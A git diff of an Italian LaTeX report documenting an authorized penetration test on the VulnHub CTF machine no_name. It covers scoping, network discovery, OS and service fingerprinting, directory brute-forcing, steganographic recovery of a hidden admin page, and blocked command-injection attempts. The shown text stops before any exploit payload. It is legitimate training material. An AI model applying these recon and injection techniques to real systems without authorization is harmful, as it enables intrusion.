@@ -81,7 +81,8 @@
 	%  SOMMARIO
 	%==================================================
 	\section*{Sommario}
-	Il presente documento ha lo scopo di illustrare in maniera esaustiva e prettamente operativa le metodologie adottate durante l'attività di Penetration Testing effettuata sulla macchina virtuale denominata \textbf{no\_name}. L'intero processo di valutazione ricalca le linee guida del Framework Generale per il Penetration Testing (FGPT). L'obiettivo primario è la documentazione accurata e riproducibile di ogni singola fase, evidenziando i vettori d'attacco scoperti, i comandi impartiti a terminale, gli script sviluppati e gli output significativi restituiti dai software di analisi.
+	Questo documento descrive le metodologie che il Gruppo 11 ha applicato per testare la macchina virtuale \textbf{no\_name} seguendo il Framework Generale per il Penetration Testing (FGPT)~\cite{ptes}. Per ogni fase abbiamo annotato strumenti usati, comandi eseguiti, script scritti e output ottenuti, in modo che chiunque possa riprodurre il percorso seguito.
+
 	
 	\vspace{1cm} 
 	
@@ -93,15 +94,13 @@
 	%  1. INTRODUZIONE
 	%==================================================
 	\chapter{Introduzione}
-	Il documento ha lo scopo di illustrare quelle che sono le metodologie adottate durante l’attività di Penetration Testing effettuata sulla macchina virtuale denominata \textbf{no\_name}, distribuita da HacLabs, seguendo le fasi principali del FGPT. L'obiettivo principale è valutare il livello di sicurezza dell'infrastruttura attraverso un processo sistematico e riproducibile, documentando ogni fase con i relativi strumenti, comandi ed output significativi.
-	
-	La macchina \textbf{no\_name} è classificata come \textit{beginner/intermediate} e presenta tre flag nascoste nelle directory home degli utenti. L'accesso iniziale è deliberatamente reso complesso, mentre la privilege escalation risulta più diretta una volta ottenuta una shell.
-	
-	L'attività è stata condotta in un ambiente virtualizzato isolato, privo di connettività verso reti di produzione. Sono stati rispettati i seguenti vincoli operativi:
+	 La macchina \textbf{no\_name}, distribuita da Haclabs su VulnHub~\cite{vulnhub}, è classificata come \textit{beginner/intermediate} e presenta tre flag nascoste nelle directory home degli utenti.  L'obiettivo è valutare il grado di sicurezza dell'host con un approccio sistematico, documentando ogni passaggio operativo. Coerentemento con quanto anticipato dall'autore, abbiamo riscontrato che la fase più impegnativa è stata l'ottenimento dell'accesso iniziale: una volta acquisita la shell, la privilege escalation si è risolta in tempi rapidi. 
+	 
+	L'attività è stata condotta in un ambiente virtualizzato isolato, senza alcuna connessione verso reti esterne per simulare una rete aziendale privata. Sono stati rispettati i seguenti vincoli operativi:
 	\begin{itemize}[leftmargin=*]
 		\item Scope limitato alla macchina \textbf{no\_name} (\texttt{192.168.238.7})
-		\item Nessuna azione distruttiva o alterazione persistente dei sistemi
-		\item Utilizzo esclusivo di tool open-source e framework standard
+		\item Nessuna azione distruttiva né modifica persistente sull'host
+		\item Uso di strumenti standard del settore, in versione open-source o gratuita
 		\item Documentazione completa di ogni azione eseguita
 	\end{itemize}
 	
@@ -140,36 +139,37 @@
 	%==================================================
 	\chapter{Fasi FGPT}
 	\section{Target Scoping}
-	La fase di \textit{Target Scoping} definisce in maniera rigorosa i confini dell'attività di Penetration Testing (le \textit{Rules of Engagement}) e i vincoli operativi a cui il team di analisi deve attenersi. 
+	La fase di \textit{Target Scoping} fissa  i confini dell'attività di Penetration Testing (le \textit{Rules of Engagement}~\cite{ptes}) a cui il gruppo deve attenersi. 
 	
-	Trattandosi di un ingaggio condotto su un ambiente di laboratorio di tipo CTF e non su un'infrastruttura di produzione, il perimetro autorizzato è stato concordato preventivamente e circoscritto in modo restrittivo alla singola macchina bersaglio. Qualsiasi asset o indirizzo IP non esplicitamente autorizzato è da considerarsi tassativamente fuori dal perimetro di test.
+	Trattandosi di un ingaggio condotto su un ambiente di laboratorio di tipo CTF e non su un'infrastruttura di produzione, il perimetro autorizzato coincide con la singola macchina bersaglio. Qualsiasi asset o indirizzo IP non esplicitamente autorizzato è da considerarsi  fuori dal perimetro di test.
 	
 	Di seguito si formalizzano i limiti logici ed etici dell'ingaggio:
 	
 	\begin{description}[font=\color{headerblue}\bfseries, leftmargin=1cm, style=nextline]
 		\item[In-Scope (Bersagli Autorizzati)] 
-		L'unico nodo su cui è consentito operare attività offensive, sia passive che attive, è l'host \textbf{no\_name} (identificato nel capitolo successivo all'indirizzo IP \textbf{\texttt{192.168.238.7}}). Rientrano nel perimetro autorizzato l'enumerazione di tutti i servizi di rete esposti (su protocolli TCP e UDP), l'attacco alle applicazioni web ospitate e le tecniche di \textit{Privilege Escalation} a livello di sistema operativo locale.
+		L'unico nodo su cui è consentito condurre attività offensive, è l'host \textbf{no\_name} (identificato nel capitolo successivo all'indirizzo IP \textbf{\texttt{192.168.238.7}}). Rientrano nel perimetro autorizzato l'enumerazione di tutti i servizi di rete esposti (su protocolli TCP e UDP), l'attacco alle applicazioni web ospitate e le tecniche di \textit{Privilege Escalation} locale.
 		
 		\item[Out-of-Scope (Bersagli Esclusi)] 
-		Sono categoricamente esclusi dai test di penetrazione il gateway dell'infrastruttura virtuale (\texttt{192.168.238.2}), l'host di servizio VirtualBox (\texttt{192.168.238.6}), il nodo attaccante Kali Linux (\texttt{192.168.238.4}) e qualsiasi altro segmento di rete estraneo al target primario.
+		Restano fuori dal perimetro di test il gateway dell'infrastruttura virtuale (\texttt{192.168.238.2}), l'host di servizio VirtualBox (\texttt{192.168.238.6}), il nodo attaccante Kali Linux (\texttt{192.168.238.4}) e qualsiasi altro segmento di rete non riconducibile al target primario.
 		
 		\item[Metodologie non consentite] 
-		Al fine di non compromettere l'integrità o la stabilità dell'ambiente di laboratorio, non è in alcun modo autorizzato l'utilizzo di tecniche che comportino la saturazione delle risorse o l'interruzione dei servizi, come attacchi di tipo \textit{Denial of Service} (DoS / DDoS). Allo stesso modo, sono escluse dal mandato tutte le metodologie basate sull'\textit{Ingegneria Sociale}.
+		Per preservare l'integrità dell'ambiente di laboratorio, non sono ammesse tecniche che comportino la saturazione delle risorse o l'interruzione dei servizi, come attacchi di tipo \textit{Denial of Service} (DoS / DDoS). Sono inoltre escluse tutte le metodologie basate sull'\textit{Ingegneria Sociale}.
 	\end{description}
 	
 	
 	\section{OSINT \& Pre-Engagement Intelligence}
-	Prima di interagire attivamente con l'ambiente di laboratorio, la primissima fase di ricognizione informativa si è concentrata sull'analisi passiva della documentazione ufficiale fornita dal creatore dell'infrastruttura (\textit{\href{https://www.vulnhub.com/entry/haclabs-no_name,429/}{Haclabs}}) sulla piattaforma di distribuzione VulnHub. Questa attività di OSINT (Open-Source Intelligence) ha permesso di delineare le regole d'ingaggio e le peculiarità tecniche del bersaglio.\\
+	Prima di interagire attivamente con l'ambiente di laboratorio, abbiamo raccolto le informazioni pubblicamente disponibili partendo dalla scheda dell'asset su VulnHub, redatta dall'autore (\textit{\href{https://www.vulnhub.com/entry/haclabs-no_name,429/}{Haclabs}}). Questa fase di OSINT (Open-Source Intelligence) ha permesso di delinerae gli obiettivi previsti e di anticipare alcune caratteristiche tecniche del bersaglio.\\
 	Dalla scheda tecnica dell'asset sono emersi i seguenti dati cruciali per l'orientamento delle operazioni:
 	
 	\begin{itemize}[label=\textcolor{black}{$\blacktriangleright$}, leftmargin=*]
-		\item \textbf{Obiettivo dell'Ingaggio:} L'ambiente è strutturato secondo la metodologia \textit{Boot2Root}. L'attaccante deve compromettere il sistema fino a ottenere i massimi privilegi amministrativi (\textit{root}) e individuare esattamente \textbf{3 flag} di verifica, posizionate dall'autore all'interno delle directory \texttt{home} degli utenti di sistema.
-		\item \textbf{Profilazione della Difficoltà:} L'asset è classificato con un grado di difficoltà \textit{Beginner/Intermediate}.
-		\item \textbf{Vettori di Attacco (Hint dell'autore):} Le note di rilascio indicano esplicitamente che l'ottenimento dell'accesso iniziale (la prima \textit{reverse shell}) richiederà uno sforzo analitico maggiore e risulterà "complicato", mentre le successive vulnerabilità per la \textit{Privilege Escalation} dovrebbero rivelarsi più dirette. Questo dettaglio suggerisce al team di concentrare il massimo sforzo temporale nell'enumerazione iniziale dei servizi esposti.
-		\item \textbf{Configurazione di Rete:} La macchina è preconfigurata per acquisire automaticamente un indirizzo IP tramite protocollo DHCP, confermando la necessità di procedere con uno \textit{sweep} attivo della rete (Target Discovery) per individuarne l'esatta collocazione logica.
+		\item \textbf{Obiettivo dell'Ingaggio:} L'ambiente è strutturato secondo la metodologia \textit{Boot2Root}. L'attaccante deve compromettere il sistema fino a ottenere i massimi privilegi amministrativi (\textit{root}) e recuperare  \textbf{3 flag} di verifica, sparse dall'autore all'interno delle directory \texttt{home} degli utenti di sistema.
+		\item \textbf{ Difficoltà:} \textit{Beginner/Intermediate}.
+		\item \textbf{Vettori di Attacco (Hint dell'autore):} Le note di rilascio indicano esplicitamente che l'ottenimento dell'accesso iniziale (la prima \textit{reverse shell}) richiederà uno sforzo maggiore e risulterà ``complicato'', mentre la successiva \textit{Privilege Escalation} dovrebbe risultare più diretta. Questa indicazione ci ha portati a dedicare la maggior parte del tempo all'enumerazione dei servizi esposti. 
+		\item \textbf{Rete:} La VM a è ottiene un indirizzo IP tramite DHCP, quindi è stato necessario individuarla tramite uno \textit{sweep} di rete (fase di Target Discovery).
 	\end{itemize}
+	
 	\section{Target Discovery}
-	La prima fase operativa ha previsto l'identificazione degli host attivi all'interno del segmento di rete locale. Operando in un ambiente \textit{Black-Box}, è stato utilizzato il tool \texttt{netdiscover} per inviare richieste ARP (Address Resolution Protocol) in \textit{broadcast} e mappare gli indirizzi IP associati ai vari MAC address presenti nel laboratorio.
+	Per individuare gli host attivi all'interno del segmento di rete locale è stato utilizzato il tool \texttt{netdiscover} per inviare richieste ARP (Address Resolution Protocol) in \textit{broadcast} e mappare gli indirizzi IP associati ai vari MAC address presenti nella subnet. Lavorando in modalità \textit{Black-Box}, questa scansione rappresentava il punto di partenza obbligato: non avevamo alcuna informazione preliminare sull'indirizzamento della VM bersaglio.
 	
 	\begin{tcolorbox}[colback=gray!10, colframe=black!70, title=Ricognizione di rete con Netdiscover]
 		\texttt{sudo netdiscover -r 192.168.238.0/24}
@@ -180,9 +180,9 @@
 		\includegraphics[width=0.85\textwidth]{assets/academy_photo/targetDiscovery/netdiscover.jpeg}
 		\caption{Output del comando netdiscover con l'identificazione degli host attivi.}
 	\end{figure}
-	L'identificazione esatta dell'host bersaglio è avvenuta tramite un processo di esclusione logica. L'output dello scanner ha rivelato la presenza di tre indirizzi IP attivi, oltre a quello della macchina attaccante (\texttt{192.168.238.4}). Avendo mappato l'infrastruttura di base, è stato possibile dedurre che l'indirizzo \texttt{192.168.238.2} corrispondeva al gateway logico assegnato di default dall'hypervisor e che l'IP \texttt{192.168.238.6} era associato a un servizio interno dell'host fisico. 
+	L'identificazione esatta dell'host bersaglio è avvenuta tramite un processo di esclusione logica. L'output dello scanner ha rivelato la presenza di tre indirizzi IP attivi, oltre a quello della macchina attaccante (\texttt{192.168.238.4}). Avendo mappato l'infrastruttura di base, è stato possibile dedurre che l'indirizzo \texttt{192.168.238.2} corrispondeva al gateway logico assegnato di default dall'hypervisor e che l'IP \texttt{192.168.238.6} era associato a un servizio interno dell'host fisico (entrambi indirizzi che ricorrono in qualsiasi rete Host-Only di VirtualBox). 
 	
-	Di conseguenza, l'unico indirizzo IP rimanente e sconosciuto, ovvero il \textbf{\texttt{192.168.238.7}}, è stato inequivocabilmente associato alla macchina virtuale \textbf{no\_name}. A conferma di tale deduzione, l'analisi del campo OUI (Organizationally Unique Identifier) del MAC Address ha restituito come vendor \textit{PCS Systemtechnik GmbH}, la firma digitale standard delle schede di rete emulate da Oracle VirtualBox.
+	Di conseguenza, l'unico indirizzo IP rimanente e sconosciuto, ovvero il \textbf{\texttt{192.168.238.7}}, corrisponde alla VM \textbf{no\_name}. A confermae, il campo OUI (Organizationally Unique Identifier) del MAC Address ha restituito come vendor \textit{PCS Systemtechnik GmbH}, prefisso assegnato alle schede di rete emulate da Oracle VirtualBox.
 	
 	\begin{figure}[H]
 		\centering
@@ -238,19 +238,19 @@
 	
 	
 	\section{Target Enumeration}
-	Una volta venuti a conoscenza dell'IP della macchina target, è stato possibile passare alla fase successiva di \textit{Enumerazione}, utilizzando strumenti che consentano di ottenere una panoramica a diversi livelli di dettaglio del sistema operativo e dei servizi di rete aperti a tutti i nodi dell'infrastruttura.
+	Identificato l'IP della macchina target, siamo passati alla fase di enumerazione vera e propria, con l'obiettivo di ottenere informazioni progressivamente dettagliati sul sistema operativo in esecuzione e sui servizi di rete esposti.
 	
 	\subsection{OS Fingerprinting}
-	Individuato l'indirizzo IP del bersaglio, il passo successivo ha riguardato la profilazione del Sistema Operativo. Al fine di simulare un approccio quanto più stealth e realistico possibile, l'attività è stata suddivisa in due fasi: una prima analisi passiva basata sull'intercettazione del traffico e una successiva validazione attiva.
+	Il passo successivo è stato il fingerprinting del sistema operativo del target. L'attività è qui presentata in due passaggi complementari — prima un'analisi passiva con \texttt{p0f}, poi una validazione attiva con \texttt{Nmap},  secondo l'ordine metodologico raccomandato dal FGPT, che predilige un approccio stealth-first. Nel flusso operativo reale del laboratorio l'ordine è stato invertito (\texttt{Nmap} prima, \texttt{p0f} integrato successivamente), ma i risultati sono indipendenti e tra loro confermativi.
 	
 	\subsubsection{Fingerprinting Passivo (p0f \& cURL)}
-	Il fingerprinting passivo si basa sull'ascolto silente dei pacchetti di rete, senza inviare payload intrusivi al target, analizzando le firmas dello stack TCP/IP e i banner applicativi. Per questa fase è stato configurato in ascolto il tool \texttt{p0f} sull'interfaccia di rete locale.
-	
+	Il fingerprinting passivo si basa sull'analisi del traffico di rete senza inviare pacchetti al target, leggendo le firme dello stack TCP/IP e i banner applicativi nelle risposte legittime. Lo strumento utilizzato è \texttt{p0f}, messo in ascolto sull'interfaccia di rete locale.
+		
 	\begin{tcolorbox}[colback=gray!10, colframe=black!70, title=Avvio sniffing passivo]
 		\texttt{sudo p0f -i eth1}
 	\end{tcolorbox}
 	
-	Per generare traffico legittimo da far analizzare allo sniffer, è stata effettuata una semplice richiesta HTTP alla radice del web server del target utilizzando \texttt{curl}.
+	Per generare traffico analizzare, è stata effettuata una semplice richiesta HTTP alla radice del web server del target utilizzando \texttt{curl}.
 	
 	\begin{figure}[H]
 		\centering
@@ -259,8 +259,8 @@
 		\label{fig:passive_curl}
 	\end{figure}
 	
-	L'intercettazione di questo scambio di pacchetti ha permesso a \texttt{p0f} di estrarre preziose informazioni diagnostiche. Sebbene l'analisi iniziale del pacchetto SYN+ACK (firmas TCP) non fosse riuscita a determinare con esattezza il kernel, l'ispezione della risposta HTTP ha rivelato esplicitamente la firma del server web.
-	
+	Dall'intercettazione, \texttt{p0f} è stato in grado di estrarre informazioni utili sul target. L'analisi del solo pacchetto SYN+ACK (firme TCP) non ha consentito di identificare con precisione il kernel, ma l'ispezione della risposta HTTP ha reso visibile la firma del server web.	
+		
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.85\textwidth]{assets/academy_photo/targetEnumeration/passive_fingerprint_two.png}
@@ -268,10 +268,9 @@
 		\label{fig:passive_p0f_metadata}
 	\end{figure}
 	
-	Come si evince dall'output (\texttt{raw\_sig = ... Apache/2.4.29 (Ubuntu)}), il sistema remoto esegue una distribuzione \textbf{Ubuntu Linux}. Un'ulteriore deduzione tecnica permette di restringere il campo: la versione 2.4.29 di Apache è storicamente il pacchetto predefinito distribuito sui repository di \textbf{Ubuntu 18.04 LTS (Bionic Beaver)}.
-	
+	L'output \texttt{(raw\_sig = ... Apache/2.4.29 (Ubuntu))} indica che il sistema remoto è una distribuzione \textbf{Ubuntu Linux}. La versione 2.4.29 di Apache è quella distribuita di default nei repository di \textbf{Ubuntu 18.04 LTS (Bionic Beaver)}, il che restringe ulteriormente l'ipotesi sul sistema operativo specifico.	
 	\subsubsection{Fingerprinting Attivo (Nmap)}
-	Per validare le ipotesi raccolte passivamente, si è proceduto con un OS Fingerprinting attivo tramite \texttt{Nmap}. Questa tecnica, seppur più rumorosa, invia pacchetti TCP/UDP malformati e sonda le risposte specifiche (RFC compliance) per determinare l'esatta architettura del kernel.
+	Per confermare le ipotesi raccolte passivamente,il finterprinting è stato ripetuto in modalità attiva tramite \texttt{Nmap}~\cite{nmap}. Questa tecnica, seppur più rumorosa, invia pacchetti TCP/UDP malformati e sonda le risposte specifiche, ma fornisce indicazioni più precise sull'architettura del kernel.
 	
 	\begin{figure}[H]
 		\centering
@@ -280,19 +279,17 @@
 		\label{fig:active_nmap_os}
 	\end{figure}
 	
-	I risultati della scansione attiva hanno confermato le deduzioni precedenti:
+	I risultati della scansione attiva hanno confermato l'analisi precedenti:
 	\begin{itemize}[label=\textcolor{black}{$\blacktriangleright$}, leftmargin=*]
-		\item L'host è effettivamente un sistema basato su \textbf{Linux}.
+		\item L'host è un sistema basato su \textbf{Linux}.
 		\item La famiglia del kernel rilevata appartiene alle release \textbf{4.X / 5.X} (nello specifico, compatibile con \textit{Linux 4.15 - 5.19}), dato perfettamente coerente con il kernel standard di un'installazione Ubuntu 18.04.
 		\item La scansione ha inoltre confermato l'apertura della \textbf{porta 80/tcp} associata al servizio HTTP.
 	\end{itemize}
 	
 	\subsection{Services Enumeration}
-	Con il fingerprinting siamo riusciti a estrarre non solo informazioni sul sistema operativo (Ubuntu) ma anche a scoprire la presenza di un servizio HTTP sulla porta 80 basato su Apache 2.4.29 e da ciò dedurre una possibile e molto probabile versione del SO che la macchina target ospita (Ubuntu 18.04 LTS).
-	È ora necessario comprendere se il target possieda altri servizi esposti e valutare eventualmente un'attività di ricognizione su tali servizi nell'eventualità che questi presentino vulnerabilità note.
-	\newline
-	Con l'ausilio di \texttt{Nmap} effettuiamo \textit{port scanning} su \texttt{no\_name} su tutte e 65535 porte:
-	
+	La fase di fingerprinting ha fornito due risultati: il sistema operativo del target è una distribuzione Ubuntu (con buona probabilità 18.04 LTS, deducendolo dalla versione di Apache) e sulla porta 80 è esposto un servizio HTTP basato su Apache 2.4.29. Resta da verificare se siano presenti altri servizi raggiungibili dall'esterno, su cui condurre eventuali ricognizioni mirate.
+	Per questo motivo è stata effettuata una scansione completa di tutte le 65535 porte TCP con \texttt{Nmap}:
+		
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.7\textwidth]{assets/academy_photo/targetEnumeration/port_scanning_nmap.jpeg}
@@ -300,12 +297,11 @@
 		\label{fig:nmap_full_scan}
 	\end{figure}
 	
-	Dai risultati si evince che l'unica porta aperta è la 80 e, come volevasi dimostrare, Nmap è riuscito a intuire sia la versione di Apache che il sistema operativo del target. A questo punto è chiaro che il focus del team nella prossima fase del framework sarà l'individuazione di \texttt{vulnerabilità web}.
+	Il risultato conferma quanto rilevato in fingerprinting: l'unica porta aperta è la 80, e \texttt{Nmap} identifica correttamente sia la versione di Apache sia la famiglia del sistema operativo. Con un solo servizio esposto, la superficie d'attacco si concentra interamente sull'applicazione web, che diventa quindi l'oggetto delle fasi successive.
 	
-	\subsection{Web Directory Enumeration (Gobuster \& Owasp Dirbuster)}
-	Avendo a portata di mano solo ed esclusivamente un web server, risulta fondamentale per il team individuare la directory tree del target, affinché sia possibile avviare l'attività di ispezione delle pagine accessibili pubblicamente e valutare la presenza di elementi interessanti durante la fase di analisi nonché condurre un'attività di directory bruteforcing.
-	Utilizzando \texttt{gobuster} e due \textit{wordlist} (\texttt{common.txt} e \texttt{big.txt})
-	
+	\subsection{Web Directory Enumeration (Gobuster \& OWASP DirBuster)}
+	Con un solo web server come bersaglio, il passo successivo consiste nel mappare le pagine effettivamente accessibili sul server e individuare eventuali risorse non linkate pubblicamente. Per questo è stato condotto un directory brute-forcing con \texttt{Gobuster} e \texttt{OWASP - Dirbuster}, utilizzando due wordlist di dimensioni crescenti: \texttt{common.txt } e \texttt{big.txt}.
+		
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.6\textwidth]{assets/academy_photo/targetEnumeration/directory_scanning_gobuster.jpeg}
@@ -315,11 +311,12 @@
 	
 	Con \texttt{common.txt} siamo riusciti a individuare due pagine accessibili:
 	\begin{itemize}[label=\textcolor{black}{$\blacktriangleright$}, leftmargin=*]
-		\item \textbf{\texttt{admin}}, molto probabilmente un'area che potrebbe contenere informazioni sensibili sull'amministratore del server o sul server stesso, valutare un'ispezione manuale della pagine e del codice html.
-		\item  \textbf{\texttt{index.php}}, la pagina di default del server Apache (diventa tale quando si installa l'ambiente php ed ha priorità maggiore rispetto a \texttt{index.html}).
+		\item \textbf{\texttt{admin}:} probabile area amministrativa, candidata a un'ispezione manuale del codice HTML alla ricerca di informazioni sensibili.
+		\item  \textbf{\texttt{index.php}}, la pagina di default del server Apache quando è installato l'ambiente PHP, che assume priorità maggiore rispetto a \texttt{index.html}).
 	\end{itemize}
-	Sembra lecito utilizzare una wordlist un po' più grande (\texttt{big.txt}) e valutare la presenza di qualche pagina che può essere sfuggita in questa prima fase:
-	
+
+	Per intercettare eventuali risorse sfuggite alla prima scansione, l'attività è stata ripetuta con una wordlist più ampia (\texttt{big.txt}:
+
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.65\textwidth]{assets/academy_photo/targetEnumeration/directory_scanning_pro.jpeg}
@@ -327,8 +324,7 @@
 		\label{fig:gobuster_big}
 	\end{figure}
 	
-	Questo secondo scan ha individuato una nuova pagina accessibile (\texttt{\textbf{/superadmin.php}}), che molto probabilmente rappresenta il fulcro dell'intera opera di Penetration Testing in quanto possibile interfaccia di amministrazione. Ma andiamo con calma e passiamo all'individuazione tramite \texttt{OWASP - Dirbuster} della gerarchia dei file del server ottenendo il seguente risultato:
-	
+	Lo scan esteso ha rivelato una risorsa aggiuntiva: \textbf{\texttt{/superadmin.php}}. Il nome suggerisce un'interfaccia amministrativa, candidata naturale come vettore d'attacco principale, ma prima di concentrarci su di essa abbiamo completato la mappatura del file system esposto utilizzando \texttt{OWASP Dirbuster}, che offre una visualizzazione ad albero delle gerarchie.
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.8\textwidth]{assets/academy_photo/targetEnumeration/dirscan_dirbuster.jpeg}
@@ -336,7 +332,7 @@
 		\label{fig:dirbuster_gui_tree}
 	\end{figure}
 	
-	Possiamo schematizzare l'output di Dirbuster con l'ausilio del seguente grafico ad albero e integrarlo con quello di gobuster per ottenere una panoramica del directory tree del web server accurata:
+	L'output di DirBuster, integrato con i risultati di gobuster, restituisce la seguente mappa complessiva delle risorse esposte dal web server:
 	
 	\begin{figure}[htbp]
 		\centering
@@ -358,337 +354,435 @@
 		\caption{Grafico strutturale definitivo della gerarchia dei file esposti dal server web del target.}
 		\label{fig:dirbuster_tree}
 	\end{figure}
-	L'analisi dell'albero evidenzia la presenza di tre pagine web, rappresentando di fatto la superficie d'attacco registrata e analizzabile dal team. Tutte queste pagine hanno restituito un codice di stato \textbf{200 OK}.
-	\section{Vulnerability Assessment}
-	Terminata l'enumerazione della superficie d'attacco, la fase di \textit{Vulnerability Assessment} si è concentrata sull'analisi approfondita dei servizi esposti, combinando tecniche di ispezione manuale (per l'individuazione di vulnerabilità logiche) e scansioni automatizzate (per il rilevamento di \textit{misconfiguration} note). L'obiettivo primario di questa fase è stato quello di confermare e catalogare i vettori di attacco sfruttabili per ottenere l'accesso iniziale al sistema (\textit{foothold}).
-	
-	\subsection{Information Disclosure e Steganografia (\texttt{/admin})}
-	L'ispezione manuale ha preso avvio dalla directory \texttt{/admin}. L'analisi del codice sorgente HTML della pagina ha rivelato una grave vulnerabilità di tipo \textit{Information Disclosure}: all'interno dei tag di commento del markup HTML è stata incautamente lasciata in chiaro la stringa \texttt{passphrase:harder}.
-	
-	\begin{figure}[H]
-		\centering
-		% Prima colonna (sinistra)
-		\begin{minipage}{0.48\textwidth}
-			\centering
-			\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/admin.png}
-			\caption{La pagina \texttt{admin} e il form ispezionato.}
-			\label{fig:admin_html}
-		\end{minipage}\hfill % \hfill spinge le minipage ai due lati opposti
-		% Seconda colonna (destra)
-		\begin{minipage}{0.48\textwidth}
-			\centering
-			\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/admin_code.png}
-			\caption{Codice HTML con la passphrase in chiaro.}
-			\label{fig:admin_code_html}
-		\end{minipage}
-	\end{figure}
-	
-	Ipotizzando che tale chiave fosse associata ai file multimediali esposti nella medesima directory, si è proceduto al download delle immagini per un'analisi steganografica. L'utilizzo del tool \texttt{steghide} in combinazione con la passphrase recuperata ha permesso di estrarre con successo un file di testo nascosto all'interno dell'immagine \texttt{haclabs.jpeg}.
-	
-	Il file \texttt{imp.txt} conteneva la stringa \texttt{c3VwZXJhZG1pbi5waHA=}. Riconoscendo il padding tipico della codifica Base64, il payload è stato decodificato, rivelando il nome in chiaro dell'interfaccia di amministrazione avanzata.
-	
-	\begin{figure}[H]
-		\centering
-		\includegraphics[width=0.7\textwidth]{assets/academy_photo/vulnerabilityAssessment/admin_steganography_cut.png}
-		\caption{Fase di estrazione e decodifica steganografica del payload dalle immagini.}
-		\label{fig:steganography_extract}
-	\end{figure}
-	
-	Questo ritrovamento ha confermato l'esistenza e l'importanza critica della pagina \texttt{superadmin.php}, precedentemente individuata in via euristica tramite l'attività di \textit{directory brute-forcing} con Gobuster.
-	
-	\subsection{Web Security Misconfigurations (Scansione Automatizzata)}
-	In ottemperanza alle \textit{best practices} di reportistica, si omette l'inserimento degli screenshot nativi dei tool di scansione, privilegiando una sintesi analitica dei risultati. Il web server è stato sottoposto ad analisi tramite \texttt{Tenable Nessus}, \texttt{Nikto} (8234 richieste elaborate in 348s).
-	
-	La scansione ha rivelato un totale di \textbf{13 evidenze} di misconfiguration, prevalentemente associate alla mancata implementazione di header di sicurezza.
-	
-	\begin{table}[H]
-		\centering
-		\renewcommand{\arraystretch}{1.3}
-		\begin{tabular}{l c p{8cm}}
-			\toprule
-			\textbf{Vulnerabilità Rilevata} & \textbf{Severity} & \textbf{Impatto / Descrizione} \\
-			\midrule
-			\textbf{Missing Anti-Clickjacking} & \textcolor{Orange}{\textbf{Medium}} & Assenza di \texttt{X-Frame-Options} o direttive CSP \texttt{frame-ancestors}. Permette attacchi di UI Redressing. \\
-			\textbf{CSP Header Not Set} & \textcolor{Orange}{\textbf{Medium}} & Mancata configurazione della Content Security Policy, esponendo il sistema a vettori XSS o iniezione dati. \\
-			\textbf{Timestamp ICMP/TCP} & \textcolor{ForestGreen}{\textbf{Low}} & OpenVAS ha rilevato l'esposizione di Timestamp (CVE-1999-0524), agevolando il calcolo dell'uptime del target. \\
-			\textbf{Server Version Leak} & \textcolor{ForestGreen}{\textbf{Low}} & Il banner HTTP espone la dicitura \texttt{Apache/2.4.29 (Ubuntu)}, facilitando il fingerprinting per l'attaccante. \\
-			\bottomrule
-		\end{tabular}
-		\caption{Sintesi delle vulnerabilità architetturali estratte dai vulnerability scanner.}
-		\label{tab:automated_scans}
-	\end{table}
-	
-	\subsection{Analisi Servizio di Stampa (CUPS su porta 631)}
-	L'indagine automatizzata ha inoltre valutato le implicazioni di sicurezza legate alla potenziale esposizione del demone \texttt{cups-browsed}. Il servizio di stampa Linux (CUPS) è noto per una recente e critica vulnerabilità associata alla registrazione remota non autenticata (CVE-2024-47176, Severity Medium/High CVSS 5.3). Sebbene teoricamente sfruttabile per l'esecuzione di codice remoto (RCE) combinando pacchetti e URL malevoli, il team ha valutato questo vettore come secondario, data l'elevata criticità e l'accesso diretto offerto dall'applicazione web.
-	
-	\subsection{Identificazione Vettore d'Attacco Principale (\texttt{/superadmin.php})}
-	L'attenzione operativa si è infine concentrata sull'analisi logica delle interfacce applicative. La pagina principale del web server (\texttt{index.php}), ironicamente nominata \textit{Fake Admin Area}, espone un form che si limita a simulare l'esecuzione di una diagnostica di rete: qualsiasi input inserito restituisce una semplice stringa di testo predefinita (\textit{"Fake ping executed"}), senza alcuna reale interazione con il sistema sottostante.
-	
-	
-	\begin{figure}[H]
-		\centering
-		\includegraphics[width=0.8\textwidth]{assets/academy_photo/vulnerabilityAssessment/index_php_fake_ping.png}
-	\end{figure}	
-	
-	Al contrario, l'interfaccia amministrativa nascosta \textbf{\texttt{superadmin.php}} invoca un'autentica esecuzione del comando di sistema \texttt{ping} verso l'indirizzo IP fornito dall'utente. I moduli web che processano input non sanitizzati per passarlo direttamente a funzioni di sistema operativo rappresentano vettori primari e critici per vulnerabilità di tipo \textbf{OS Command Injection}. 
-	
-	Durante i primi tentativi di test \textit{Black-Box} condotti su questa seconda interfaccia, volti a concatenare comandi di sistema (tramite operatori come \texttt{\&\&} e \texttt{;}), l'applicazione ha restituito esclusivamente pagine vuote, evidenziando l'intervento di un meccanismo di filtraggio lato server (presumibilmente una \textit{blacklist} di caratteri speciali).
-	
-	\begin{figure}[H]
-		\centering
-		\begin{minipage}{0.48\textwidth}
-			\centering
-			\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/superadmin_first_try.png}
-			\caption{Tentativo fallito di concatenazione con l'operatore AND logico (\texttt{\&\&}).}
-			\label{fig:injection_fail_1}
-		\end{minipage}\hfill
-		\begin{minipage}{0.48\textwidth}
-			\centering
-			\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/superadmin_second_try.png}
-			\caption{Tentativo fallito di esecuzione sequenziale con terminatore (\texttt{;}).}
-			\label{fig:injection_fail_2}
-		\end{minipage}
-	\end{figure}
-	
-	La validazione di questa vulnerabilità e il successivo \textit{bypass} dei filtri, che ha condotto alla compromissione iniziale del sistema, sono descritti nel capitolo relativo alla \textit{Target Exploitation}.
-	
-\section{Target Exploitation}
-In questa sezione, il team si occuperà di eseguire attività di exploit sulla macchina target utilizzando le informazioni raccolte nelle fasi precedenti. L'obiettivo primario è valutare se le vulnerabilità descritte nella fase di \textit{Vulnerability Assessment} possano essere concretamente armate per prendere il controllo (parziale o totale) di \texttt{no\_name} o per estrarre dati sensibili.
-
